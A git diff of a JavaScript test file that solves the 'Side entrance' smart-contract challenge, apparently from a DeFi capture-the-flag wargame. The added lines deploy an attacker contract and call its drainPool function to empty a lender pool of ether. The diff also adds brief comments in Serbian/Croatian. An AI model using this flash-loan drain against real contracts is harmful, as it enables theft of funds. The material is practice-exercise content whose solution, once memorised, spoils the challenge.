@@ -12,11 +12,14 @@ describe('[Challenge] Side entrance', function () {
         [deployer, attacker] = await ethers.getSigners();
 
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
-        this.pool = await SideEntranceLenderPoolFactory.deploy();
-        
-        await this.pool.deposit({ value: ETHER_IN_POOL });
+        const FlashLoanEtherReceiverFactory= await ethers.getContractFactory('FlashLoanEtherReceiver',attacker)
 
-        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
+        this.pool = await SideEntranceLenderPoolFactory.deploy();
+        this.attackerContract=await FlashLoanEtherReceiverFactory.deploy()
+        
+        await this.pool.deposit({ value: ETHER_IN_POOL });//deployeru poola se ostavlja ovo?
+
+        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);//AKO NIJE DEFAULTNO 0?
 
         expect(
             await ethers.provider.getBalance(this.pool.address)
@@ -24,7 +27,7 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await this.attackerContract.connect(attacker).drainPool(this.pool.address,ETHER_IN_POOL)
     });
 
     after(async function () {
@@ -32,7 +35,8 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.be.equal('0');
-        
+
+        //OVDE NIJE PRICA KO S TOKENIMA, IMA MOGUCIH GAS TROSKOVA
         // Not checking exactly how much is the final balance of the attacker,
         // because it'll depend on how much gas the attacker spends in the attack
         // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
